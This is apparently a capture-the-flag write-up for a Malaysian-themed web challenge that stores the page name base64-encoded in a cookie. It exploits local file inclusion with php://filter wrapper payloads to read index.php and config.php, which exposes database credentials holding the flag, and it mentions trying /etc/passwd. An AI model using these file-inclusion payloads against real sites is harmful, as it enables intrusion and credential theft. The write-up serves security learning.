---
description: Ayuh nyanyikan lagu patriotik bersama sempena hari kemerdekaan Malaysia.
---

# Merdeka

The website shows us three pages with different national songs and lyrics

<figure><img src="../../../.gitbook/assets/image (569).png" alt=""><figcaption></figcaption></figure>

```html
<a href="javascript:void(0)" onclick="setPage('tanggal31.html')">Tanggal 31</a>
<a href="javascript:void(0)" onclick="setPage('keranamu.html')">Keranamu Malaysia</a>
<a href="javascript:void(0)" onclick="setPage('jalurgemilang.html')">Jalur Gemilang</a>
```

Interesting stuff here, the `setPage` function takes in the page name and encodes it in base64 and sets the value in the cookie &#x20;

```javascript
function setPage(page) {
        const encodedPage = btoa(page);
        document.cookie = "page=" + encodedPage + ";path=/";
        location.reload();
    }
```

The page cookie directly translates to either of the 3 pages in base 64. For example:

* tanggal31.html | page = `dGFuZ2dhbDMxLmh0bWw=`
* keranamu.html | page = `a2VyYW5hbXUuaHRtbA==`
* jalurgemilang.html | page = `amFsdXJnZW1pbGFuZy5odG1s`

Now that we know that this seems like an LFI vulnerability. Let's check out the source code which is `index.php` by using a PHP wrapper



`php://filter/read=convert.base64-encode/resource=/var/www/html/index.php`



By the time of writing this the infra of the ctf already shut down so can't provide the ss. But the `index.php` doesn't show us any flag. I got stuck here lol, even tried to read `/etc/passwd`.&#x20;

<figure><img src="../../../.gitbook/assets/image (571).png" alt=""><figcaption></figcaption></figure>

Eventually, i left the challenge half-way

Apparently, the solution was to check common files like **`config.php`** which contained databse connections and root folders.

`php://filter/read=convert.base64-encode/resource=/var/www/html/config.php`

Encode it into base64 and plug it in the page cookie and we will receive the `config.php` encoded in base64

```
PD9waHAKJGhvc3QgPSAibG9jYWxob3N0IjsKJHVzZXJuYW1lID0gImN1YmFhbiBtZW5nZWhhY2sga2EgaXR1IjsKJHBhc3N3b3JkID0gIjMxMDh7bTRyMV9rMXQ0X3c0cmc0X24zZzRyNH0iOwokZGF0YWJhc2UgPSAiZmxhZyI7CgokY29ubiA9IG5ldyBteXNxbGkoJGhvc3QsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGF0YWJhc2UpOwoKaWYgKCRjb25uLT5jb25uZWN0X2Vycm9yKSB7CiAgICBkaWUoIkNvbm5lY3Rpb24gZmFpbGVkOiAiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwp9CgplY2hvICJDb25uZWN0ZWQgc3VjY2Vzc2Z1bGx5IjsKPz4K
```

When decoded:

<pre class="language-php"><code class="lang-php"><strong>&#x3C;?php
</strong><strong>
</strong>$host = "localhost";
$username = "cubaan mengehack ka itu";
$password = "3108{m4r1_k1t4_w4rg4_n3g4r4}";
$database = "flag";

$conn = new mysqli($host, $username, $password, $database);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

echo "Connected successfully";
?>
</code></pre>

Flag: <mark style="color:red;">`3108{m4r1_k1t4_w4rg4_n3g4r4}`</mark>
